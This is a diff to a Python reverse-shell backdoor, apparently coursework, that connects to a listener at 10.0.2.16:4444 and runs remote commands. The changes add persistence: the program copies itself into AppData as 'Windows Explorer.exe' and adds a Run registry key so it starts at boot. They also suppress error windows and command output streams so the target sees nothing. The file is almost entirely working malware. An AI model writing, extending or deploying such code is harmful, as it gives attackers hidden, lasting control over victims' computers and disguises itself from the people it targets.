@@ -3,10 +3,18 @@
 #file is series of char so to transfer file we should read the file as seq of char,send this seq of char,create new empty file at destination,store the transferred seq of char in new file
 #this method used to transfer file betwn two sys using socket and py
 import socket,subprocess,json,os,base64
+import sys#to exit program without showing warninr or error message use sys to exit 
+import shutil#to copy(past/put) stuff in python
 class Backdoor:
     def __init__(self,ip,port):
+        self.become_persistence()
         self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
         self.connection.connect((ip,port))
+    def become_persistence(self):
+        evil_file_location=os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable,evil_file_location)#first arg is source file ,current file we are running from sice it is exe so sys.executable.if it was py file use(replace with)__file__
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\run /v test /t REG_SZ /d "' + evil_file_location + '"',shell=True)
     def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
         json_data=json.dumps(data)#convert to json
         self.connection.send(json_data)   
@@ -19,7 +27,8 @@ class Backdoor:
             except ValueError:
                 continue            
     def execute_system_command(self,command):
-        return subprocess.check_output(command)
+        # DEVNULL=open(os.devnull,'wb')#for py 2.7 and remove subprocess of below line
+        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
     def change_working_directory_to(self,path):
         os.chdir(path)
         return "[+] changing working direectory to " + path
@@ -36,7 +45,7 @@ class Backdoor:
             try:
                 if command[0]=="exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0]=="cd" and len(command) > 1:
                     command_result=self.change_working_directory_to(command[1]) 
                 elif command[0]=="download":
@@ -48,9 +57,13 @@ class Backdoor:
             except Exception:
                 command_result="[-] error during your command execution"        
             self.reliable_send(command_result)
-        self.connection.close()
-backdoor_instance=Backdoor("10.0.2.16",4444)
-backdoor_instance.run()        
+        # self.connection.close()#no need as there is exit()
+
+try:#this try catch for when listner not listening and backdoor is persistance(execute when sys boot automatically) because error box appear at target if not listening.
+    backdoor_instance=Backdoor("10.0.2.16",4444)
+    backdoor_instance.run()
+except Exception:
+    sys.exit()            
 
 
 # execute this in target
